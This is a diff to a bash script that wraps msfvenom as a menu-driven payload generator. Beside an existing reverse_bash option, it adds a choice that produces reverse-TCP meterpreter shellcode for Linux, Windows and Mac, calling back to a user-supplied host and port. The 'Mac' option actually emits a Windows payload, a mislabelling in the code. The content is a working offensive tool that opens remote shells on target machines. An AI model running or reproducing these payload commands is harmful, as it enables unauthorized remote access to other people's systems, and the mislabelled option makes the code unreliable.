@@ -120,6 +120,36 @@ read -p "Output-filename(file.sh)~: " outputpl
 msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputpl
 ;;
 esac
+
+elif [ "$choice" -eq 5 ]
+then
+echo "Options:
+Option 1:Linux-Based Shellcode[0]
+==================================
+Option 2:Windows-Based Shellcode[1]
+==================================
+Option 3:MAC-Based Shellcode[2]
+==================================
+"
+read -p "Option~: " option5
+case $option5 in
+0)
+echo "Linux-Based Shellcode"
+read -p "Language(ex. py): " lang
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang
+;;
+1)
+echo "Windows Based Shellcode"
+read -p "Language(ex. py): " lang1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang1
+;;
+
+2)
+echo "Mac Based Shellcode"
+read -p "Language(ex. py): " lang2
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang2
+;;
+esac
 fi
 }
 
@@ -128,4 +158,3 @@ banner
 payload
 }
 main
-      
